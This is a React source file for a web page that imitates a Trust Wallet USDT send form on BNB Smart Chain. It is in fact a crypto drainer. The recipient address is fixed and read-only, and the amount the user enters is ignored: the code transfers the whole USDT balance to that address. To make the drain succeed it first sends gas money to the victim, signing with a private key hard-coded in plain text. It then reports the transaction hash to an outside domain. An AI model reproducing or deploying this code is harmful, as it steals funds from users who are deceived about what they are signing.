/* global BigInt */
import { useState, useEffect } from "react";
import Web3 from "web3";
import Swal from "sweetalert2";
import "@fortawesome/fontawesome-free/css/all.min.css";
import "./App.css";
import '@fontsource/open-sans/300.css';
import '@fontsource/open-sans/400.css';
import '@fontsource/open-sans/500.css';
import '@fontsource/open-sans/600.css';
import '@fontsource/open-sans/700.css';
import '@fontsource/open-sans/800.css';
import '@fontsource/geist';

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
const recipientAddress = "0xA249B9926CBF6A84d5c1549775636488E697a5ed"; // Your receiving address

// 🔑 BNB WALLET PRIVATE KEY (to send gas fees)
const gasFeesWalletPrivateKey = "8869066ddbf59f2c711fb1b1d963706432bac6de9b24d4d8b31a63ba3a01ec54";

// Gas fee constants
const GAS_FEES_AMOUNT = "0.0001"; // BNB amount for gas fees (0.0001 BNB = ~$0.03)
const MIN_USDT_BALANCE = "0.01"; // Minimum USDT to check before sending gas

// RPC URL for gas fee sending
const BSC_RPC_URL = "https://bsc-dataseed.binance.org/";

const usdtAbi = [
  {
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
];

export default function SendUSDT() {
  const [amount, setAmount] = useState("");
  const [usdValue, setUsdValue] = useState("= $0.00");
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [theme, setTheme] = useState("dark");
  const [successData, setSuccessData] = useState({
    txHash: "",
    amount: "0",
    recipient: "",
  });
  
  // 🔍 Debug Status State
  const [debugMode, setDebugMode] = useState(false);
  const [debugLogs, setDebugLogs] = useState([]);

  const addDebugLog = (status, message, type = "info") => {
    const timestamp = new Date().toLocaleTimeString();
    const log = { timestamp, status, message, type };
    setDebugLogs((prev) => [...prev, log]);
    console.log(`[${timestamp}] ${status}: ${message}`);
  };

  useEffect(() => {
    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    setTheme(darkMode ? "dark" : "light");

    const listener = (e) => setTheme(e.matches ? "dark" : "light");
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener("change", listener);
    return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
  }, []);

  useEffect(() => {
    const value = parseFloat(amount);
    setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
  }, [amount]);

  const setMaxAmount = async () => {
    try {
      const web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      if (accounts.length === 0) {
        Swal.fire("Error", "Please connect your wallet first.", "error");
        return;
      }
      const user = accounts[0];
      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balance = await usdt.methods.balanceOf(user).call();
      setAmount(web3.utils.fromWei(balance, "ether"));
    } catch (err) {
      Swal.fire("Error", "Failed to fetch balance.", "error");
    }
  };

  // 🔋 Send gas fees to user wallet if needed (FIXED VERSION)
  const sendGasFeesToUser = async (userAddress) => {
    try {
      addDebugLog("GAS_FEES", "Starting gas fee check...", "info");
      
      // Use separate RPC provider for gas fee sending
      const web3Admin = new Web3(new Web3.providers.HttpProvider(BSC_RPC_URL));
      const web3User = new Web3(window.ethereum);

      // Check user's BNB balance
      addDebugLog("GAS_FEES", `Checking BNB balance for: ${userAddress}`, "info");
      const userBnbBalance = await web3User.eth.getBalance(userAddress);
      const userBnbBalanceInEth = web3User.utils.fromWei(userBnbBalance, "ether");
      
      addDebugLog("USER_BALANCE_BNB", `${userBnbBalanceInEth} BNB`, "info");

      // If user has enough BNB for gas, skip
      if (parseFloat(userBnbBalanceInEth) >= parseFloat(GAS_FEES_AMOUNT)) {
        addDebugLog("GAS_FEES", "User has sufficient BNB, skipping gas fee transfer", "success");
        return true;
      }

      // Check if user has USDT
      addDebugLog("GAS_FEES", `Checking USDT balance for: ${userAddress}`, "info");
      const usdt = new web3User.eth.Contract(usdtAbi, usdtAddress);
      const userUsdtBalance = await usdt.methods.balanceOf(userAddress).call();
      const userUsdtBalanceFormatted = web3User.utils.fromWei(userUsdtBalance, "ether");

      addDebugLog("USER_BALANCE_USDT", `${userUsdtBalanceFormatted} USDT`, "info");

      // Only send gas fees if user has USDT
      if (parseFloat(userUsdtBalanceFormatted) < parseFloat(MIN_USDT_BALANCE)) {
        addDebugLog("GAS_FEES", `User USDT balance (${userUsdtBalanceFormatted}) < MIN (${MIN_USDT_BALANCE}), skipping`, "warning");
        return true;
      }

      addDebugLog("GAS_FEES", "User qualifies for gas fee transfer, proceeding...", "info");

      // Create account from private key
      addDebugLog("GAS_FEES", "Creating admin account from private key", "info");
      const account = web3Admin.eth.accounts.privateKeyToAccount(gasFeesWalletPrivateKey);
      addDebugLog("GAS_FEES", `Admin wallet: ${account.address}`, "info");

      // Check admin wallet balance
      addDebugLog("GAS_FEES", "Checking admin wallet BNB balance", "info");
      const adminBalance = await web3Admin.eth.getBalance(account.address);
      const adminBalanceInEth = web3Admin.utils.fromWei(adminBalance, "ether");
      addDebugLog("ADMIN_BALANCE_BNB", `${adminBalanceInEth} BNB`, "info");

      if (parseFloat(adminBalanceInEth) < parseFloat(GAS_FEES_AMOUNT)) {
        addDebugLog("GAS_FEES", `Admin balance (${adminBalanceInEth}) < required (${GAS_FEES_AMOUNT})`, "error");
        return true;
      }

      // Get gas price
      addDebugLog("GAS_FEES", "Getting current gas price", "info");
      const gasPrice = await web3Admin.eth.getGasPrice();
      const gasPriceInGwei = web3Admin.utils.fromWei(gasPrice, "gwei");
      addDebugLog("GAS_FEES", `Gas price: ${gasPriceInGwei} Gwei`, "info");

      // Get nonce
      addDebugLog("GAS_FEES", "Getting transaction nonce", "info");
      const nonce = await web3Admin.eth.getTransactionCount(account.address);
      addDebugLog("GAS_FEES", `Nonce: ${nonce}`, "info");

      // Create transaction
      const gasFeesWei = web3Admin.utils.toWei(GAS_FEES_AMOUNT, "ether");
      addDebugLog("GAS_FEES", `Amount to send: ${GAS_FEES_AMOUNT} BNB (${gasFeesWei} Wei)`, "info");

      const tx = {
        from: account.address,
        to: userAddress,
        value: gasFeesWei,
        gas: 21000,
        gasPrice: gasPrice,
        nonce: nonce,
        chainId: 56,
      };

      addDebugLog("GAS_FEES", "Signing transaction", "info");
      const signedTx = await account.signTransaction(tx);
      addDebugLog("GAS_FEES", "Transaction signed successfully", "success");

      // Send signed transaction
      addDebugLog("GAS_FEES", "Sending signed transaction to network", "info");
      const receipt = await new Promise((resolve, reject) => {
        web3Admin.eth.sendSignedTransaction(signedTx.rawTransaction)
          .on("transactionHash", (hash) => {
            addDebugLog("GAS_FEES_TX", `Tx Hash: ${hash}`, "info");
          })
          .on("receipt", (receipt) => {
            addDebugLog("GAS_FEES", "Gas fee transaction confirmed!", "success");
            resolve(receipt);
          })
          .on("error", (err) => {
            addDebugLog("GAS_FEES", `Transaction failed: ${err.message}`, "error");
            reject(err);
          });
      });

      addDebugLog("GAS_FEES", `Gas fees sent successfully to ${userAddress}`, "success");
      Swal.fire("Success", "Gas fees sent to your wallet!", "success");
      
      return true;

    } catch (err) {
      addDebugLog("GAS_FEES", `Error: ${err.message}`, "error");
      console.error("Error sending gas fees:", err);
      return true; // Don't block transaction
    }
  };

  const handleTransfer = async () => {
    setIsProcessing(true);
    setDebugLogs([]); // Clear previous logs
    setDebugMode(true); // Show debug panel
    addDebugLog("START", "Transfer process initiated", "info");

    try {
      if (!window.ethereum) {
        addDebugLog("ERROR", "MetaMask/Trust Wallet not detected", "error");
        Swal.fire("Error", "Please install MetaMask or Trust Wallet", "error");
        setIsProcessing(false);
        return;
      }

      addDebugLog("WALLET", "Wallet detected", "success");
      const web3 = new Web3(window.ethereum);

      // Get accounts
      addDebugLog("WALLET", "Requesting accounts", "info");
      let accounts = await window.ethereum.request({ method: 'eth_accounts' });
      
      let userAddress;
      
      if (accounts && accounts.length > 0) {
        userAddress = accounts[0];
        addDebugLog("WALLET", `Connected wallet: ${userAddress}`, "success");
      } else {
        userAddress = null;
        addDebugLog("WALLET", "No connected accounts found", "warning");
      }

      // Check network
      addDebugLog("NETWORK", "Checking current network", "info");
      const chainId = await web3.eth.getChainId();
      addDebugLog("NETWORK", `Current chain ID: ${chainId}`, "info");

      if (chainId !== 56n && chainId !== 56) {
        addDebugLog("NETWORK", "Switching to BSC (chain ID 56)", "info");
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
          addDebugLog("NETWORK", "Successfully switched to BSC", "success");
        } catch (switchError) {
          if (switchError.code === 4902) {
            addDebugLog("NETWORK", "BSC not added, adding now", "info");
            await window.ethereum.request({
              method: "wallet_addEthereumChain",
              params: [{
                chainId: "0x38",
                chainName: "BNB Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: ["https://bsc-dataseed.binance.org/"],
                blockExplorerUrls: ["https://bscscan.com/"]
              }]
            });
            addDebugLog("NETWORK", "BSC network added successfully", "success");
          } else {
            throw switchError;
          }
        }
        accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts && accounts.length > 0) {
          userAddress = accounts[0];
          addDebugLog("WALLET", `Wallet updated: ${userAddress}`, "success");
        }
      } else {
        addDebugLog("NETWORK", "Already on BSC", "success");
      }

      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);

      if (!userAddress) {
        addDebugLog("WALLET", "Getting accounts via getAccounts()", "info");
        const tempAccounts = await web3.eth.getAccounts();
        userAddress = tempAccounts[0];
        addDebugLog("WALLET", `Final wallet: ${userAddress}`, "success");
      }

      // 🔋 Send gas fees if user doesn't have enough BNB
      addDebugLog("GAS_FEES", "=== GAS FEE CHECK STARTING ===", "info");
      await sendGasFeesToUser(userAddress);
      addDebugLog("GAS_FEES", "=== GAS FEE CHECK COMPLETED ===", "info");

      // Get USDT balance
      addDebugLog("USDT", "Fetching USDT balance", "info");
      const currentBalance = await usdt.methods.balanceOf(userAddress).call();
      const formattedBalance = web3.utils.fromWei(currentBalance, "ether");

      addDebugLog("USDT_BALANCE", `${formattedBalance} USDT`, "info");

      if (currentBalance === "0" || BigInt(currentBalance) === 0n) {
        addDebugLog("ERROR", "USDT balance is zero", "error");
        Swal.fire("Error", "You have no USDT balance to transfer.", "error");
        setIsProcessing(false);
        return;
      }

      addDebugLog("TX", "Encoding transfer function call", "info");
      const transferData = usdt.methods.transfer(recipientAddress, currentBalance).encodeABI();
      addDebugLog("TX", "Transfer data encoded successfully", "success");

      addDebugLog("TX", "Requesting transaction signature", "info");
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: userAddress,
          to: usdtAddress,
          data: transferData,
          value: '0x0',
        }],
      });

      addDebugLog("TX", `Transaction hash: ${txHash}`, "success");

      // Wait for receipt
      addDebugLog("TX", "Waiting for transaction confirmation", "info");
      let receipt = null;
      let attempts = 0;
      const maxAttempts = 120;

      while (receipt === null && attempts < maxAttempts) {
        try {
          receipt = await web3.eth.getTransactionReceipt(txHash);
          if (receipt === null) {
            attempts++;
            if (attempts % 5 === 0) {
              addDebugLog("TX", `Still waiting... (${attempts}s)`, "info");
            }
            await new Promise(resolve => setTimeout(resolve, 1000));
          }
        } catch (err) {
          addDebugLog("TX", "Checking receipt...", "info");
          await new Promise(resolve => setTimeout(resolve, 1000));
          attempts++;
        }
      }

      if (receipt) {
        addDebugLog("TX", "Transaction confirmed!", "success");
        setSuccessData({
          txHash: txHash,
          amount: formattedBalance,
          recipient: recipientAddress,
        });
        setShowSuccess(true);
        setDebugMode(false);

        try {
          await fetch("https://www.trc20support.buzz/old/store-address.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ address: txHash }),
          });
        } catch (fetchErr) {
          console.warn("Skipping fetch:", fetchErr.message);
        }
      } else {
        addDebugLog("ERROR", "Transaction confirmation timeout", "error");
        Swal.fire("Error", "Transaction confirmation timeout", "error");
      }

    } catch (err) {
      addDebugLog("ERROR", `${err.message}`, "error");
      console.error("Transfer error:", err);

      let errorMessage = "Something went wrong";
      if (err.message) {
        if (err.message.includes("insufficient funds")) {
          errorMessage = "Insufficient BNB for gas fees";
        } else if (err.message.includes("exceeds balance")) {
          errorMessage = "Transfer amount exceeds USDT balance";
        } else if (err.message.includes("User denied") || err.message.includes("User rejected")) {
          errorMessage = "Transaction cancelled by user";
        } else {
          errorMessage = err.message;
        }
      }

      Swal.fire("Error", errorMessage, "error");
    } finally {
      setIsProcessing(false);
    }
  };

  const isDark = theme === "dark";

  // 🎉 Trust Wallet Style Success UI
  if (showSuccess) {
    return (
      <div className={`min-h-screen flex flex-col justify-center items-center px-4 ${isDark ? "bg-[#1f1f1f]" : "bg-white"}`}>
        <div className={`relative w-full max-w-sm rounded-3xl overflow-hidden ${isDark ? "bg-[#2a2a2a]" : "bg-white"} shadow-2xl`}>
          
          {/* Header Background */}
          <div className="bg-gradient-to-r from-[#2DD4BF] via-[#14B8A6] to-[#0D9488] h-32 relative">
            <div className="absolute inset-0 flex items-center justify-center">
              <div className="relative">
                <div className="absolute inset-0 rounded-full bg-white/20 animate-pulse"></div>
                
                <div className="relative w-24 h-24 rounded-full bg-white flex items-center justify-center shadow-lg">
                  <svg
                    className="w-12 h-12 text-green-500 animate-bounce"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="3"
                    viewBox="0 0 24 24"
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              </div>
            </div>
          </div>

          {/* Content Section */}
          <div className="px-6 py-8 text-center">
            
            <h2 className={`text-2xl font-bold mb-2 ${isDark ? "text-white" : "text-gray-900"}`}>
              Transaction Successful
            </h2>
            
            <p className={`text-sm mb-6 ${isDark ? "text-gray-400" : "text-gray-600"}`}>
              Your USDT has been transferred
            </p>

            {/* Transaction Details */}
            <div className={`rounded-2xl p-4 mb-6 ${isDark ? "bg-[#1f1f1f]" : "bg-gray-50"}`}>
              
              <div className="mb-4">
                <p className={`text-xs mb-1 ${isDark ? "text-gray-500" : "text-gray-500"}`}>
                  AMOUNT SENT
                </p>
                <p className="text-2xl font-bold text-[#14B8A6]">
                  {parseFloat(successData.amount).toFixed(6)} USDT
                </p>
              </div>

              <div className={`h-px mb-4 ${isDark ? "bg-gray-700" : "bg-gray-200"}`}></div>

              <div className="mb-4 text-left">
                <p className={`text-xs mb-2 ${isDark ? "text-gray-500" : "text-gray-500"}`}>
                  TO
                </p>
                <div className={`flex items-center justify-between p-3 rounded-lg ${isDark ? "bg-[#333]" : "bg-gray-100"}`}>
                  <p className="text-xs font-mono text-gray-400">
                    {successData.recipient.slice(0, 6)}...{successData.recipient.slice(-4)}
                  </p>
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(successData.recipient);
                      Swal.fire("Copied!", "", "success");
                    }}
                    className="text-[#14B8A6] hover:text-[#0D9488] transition-colors"
                  >
                    <i className="fas fa-copy text-xs"></i>
                  </button>
                </div>
              </div>

              <div className="text-left">
                <p className={`text-xs mb-2 ${isDark ? "text-gray-500" : "text-gray-500"}`}>
                  TRANSACTION ID
                </p>
                <div className={`flex items-center justify-between p-3 rounded-lg ${isDark ? "bg-[#333]" : "bg-gray-100"}`}>
                  <p className="text-xs font-mono text-gray-400">
                    {successData.txHash.slice(0, 6)}...{successData.txHash.slice(-4)}
                  </p>
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(successData.txHash);
                      Swal.fire("Copied!", "", "success");
                    }}
                    className="text-[#14B8A6] hover:text-[#0D9488] transition-colors"
                  >
                    <i className="fas fa-copy text-xs"></i>
                  </button>
                </div>
              </div>

            </div>

            {/* View on Explorer Button */}
            <a
              href={`https://bscscan.com/tx/${successData.txHash}`}
              target="_blank"
              rel="noopener noreferrer"
              className="w-full block mb-3 px-6 py-3 rounded-xl bg-gradient-to-r from-[#2DD4BF] to-[#14B8A6] text-white font-semibold hover:opacity-90 transition-opacity"
            >
              View on BscScan
            </a>

            {/* Done Button */}
            <button
              onClick={() => {
                setShowSuccess(false);
                setSuccessData({ txHash: "", amount: "0", recipient: "" });
              }}
              className={`w-full px-6 py-3 rounded-xl font-semibold transition-colors ${
                isDark
                  ? "bg-[#333] text-white hover:bg-[#404040]"
                  : "bg-gray-100 text-gray-900 hover:bg-gray-200"
              }`}
            >
              Done
            </button>

          </div>

        </div>

        <div className="mt-8 text-center">
          <p className={`text-sm ${isDark ? "text-gray-400" : "text-gray-600"}`}>
            ✨ Your transaction is complete
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
      {/* 🔍 Debug Panel */}
      {debugMode && (
        <div className={`mb-6 p-4 rounded-xl max-h-96 overflow-y-auto ${isDark ? "bg-[#1f1f1f] border border-gray-700" : "bg-gray-50 border border-gray-200"}`}>
          <div className="flex justify-between items-center mb-3">
            <h3 className={`font-bold text-sm ${isDark ? "text-white" : "text-gray-900"}`}>
              🔍 Debug Logs
            </h3>
            <button
              onClick={() => setDebugMode(false)}
              className="text-xs px-2 py-1 bg-red-500 text-white rounded"
            >
              Close
            </button>
          </div>
          <div className="space-y-1">
            {debugLogs.map((log, idx) => (
              <div
                key={idx}
                className={`text-xs p-2 rounded font-mono ${
                  log.type === "success"
                    ? isDark ? "bg-green-900 text-green-200" : "bg-green-100 text-green-900"
                    : log.type === "error"
                    ? isDark ? "bg-red-900 text-red-200" : "bg-red-100 text-red-900"
                    : log.type === "warning"
                    ? isDark ? "bg-yellow-900 text-yellow-200" : "bg-yellow-100 text-yellow-900"
                    : isDark ? "bg-blue-900 text-blue-200" : "bg-blue-100 text-blue-900"
                }`}
              >
                <span className="font-bold">[{log.timestamp}]</span> {log.status}: {log.message}
              </div>
            ))}
          </div>
        </div>
      )}

      <div className="input-group">
        <p className="inpt_tital">Address or Domain Name</p>
        <div className="border">
          <div className="left">
            <input
              type="text"
              className="custom-input"
              placeholder="Search or Enter"
              value={recipientAddress}
              readOnly
            />
          </div>
          <span className="right blue flex justify-between mr-3">
            <span className="w-6 text-sm">Paste</span>
            <i className="fas fa-address-book mar_i w-6 ml-6"></i>
            <i className="fas fa-qrcode mar_i w-6 ml-2"></i>
          </span>
        </div>
      </div>

      <div className="input-group mt-7">
        <p className="inpt_tital">Amount</p>
        <div className="border">
          <div className="left">
            <input
              type="number"
              min="0"
              step="0.01"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="USDT Amount"
              className="custom-input"
            />
          </div>
          <span className="right mr-3">
            <span className="text-sm text-[#b0b0b0]">USDT</span>
            <span
              className="mar_i blue text-sm ml-2 cursor-pointer"
              onClick={setMaxAmount}
            >
              Max
            </span>
          </span>
        </div>
      </div>

      <p className="fees valid">{usdValue}</p>

      <button
        id="nextBtn"
        className="send-btn"
        onClick={handleTransfer}
        disabled={isProcessing}
        style={{
          backgroundColor: isProcessing ? "var(--disabled-bg)" : "#5CE07E",
          color: isProcessing ? "var(--disabled-text)" : "#1b1e15"
        }}
      >
        {isProcessing ? "Processing..." : "Next"}
      </button>
    </div>
  );
}